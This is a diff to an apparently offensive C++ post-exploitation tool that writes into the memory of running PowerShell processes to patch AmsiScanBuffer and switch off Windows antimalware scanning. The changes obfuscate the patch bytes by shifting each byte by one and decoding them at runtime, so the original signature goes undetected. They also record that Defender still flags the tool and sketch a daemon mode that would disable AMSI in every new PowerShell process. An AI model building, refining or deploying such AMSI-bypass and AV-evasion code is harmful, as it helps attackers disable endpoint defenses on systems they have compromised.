@@ -7,13 +7,21 @@ Remote patching of AMSI in all poiwershell/amsi loaded processes.
 
 Will likely require admin for OpenProcess. Could be a good post-ex tool?
 
+
+
+*/
+//OPTIONAL/IDEA; monitor/daemon mode so anytime a pwsh runs/poll for a run, run this on it and disable amsi.
+
+/*
+AV Stuff:
+
+Defender flags on this in the current state: 
+    >> Behavior:Win32/Gracing.IQ - which ChatGPT tells me is a Behavior based detection. Fun.
+
 */
 
-//OPTIONAL; monitor/daemon mode so anytime a pwsh runs/poll for a run, run this on it and disable amsi.
-
-
 #include <windows.h>
-#include <tlhelp32.h>remoteremoteProcessPID
+#include <tlhelp32.h>
 #include <vector>
 #include <string>
 #include <algorithm>
@@ -30,12 +38,23 @@ public:
     HANDLE remoteProcessHandle;
     HMODULE remoteAmsiLibraryAddress;
     uintptr_t remoteAmsiScanBufferFunctionAddress;
+    //OG patch
+    //unsigned char patch[6] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }; //this is prolly signatured
+
+    //(badly) obsf patch
+    unsigned char patch[6] = { 0xB9, 0x58, 0x01, 0x08, 0x81, 0xC4 };
+
+
 
     RemoteAmsiPatch(DWORD pid) {
         this->remoteProcessPID = pid;
+
+        //deobs patch
+        for (int i = 0; i < 6; i++) {
+            patch[i] = patch[i] - 1;
+        }
     }
 
-    unsigned char patch[6] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }; //this is prolly signatured
     //var for amsi address
     //var for scanbufferaddress
 
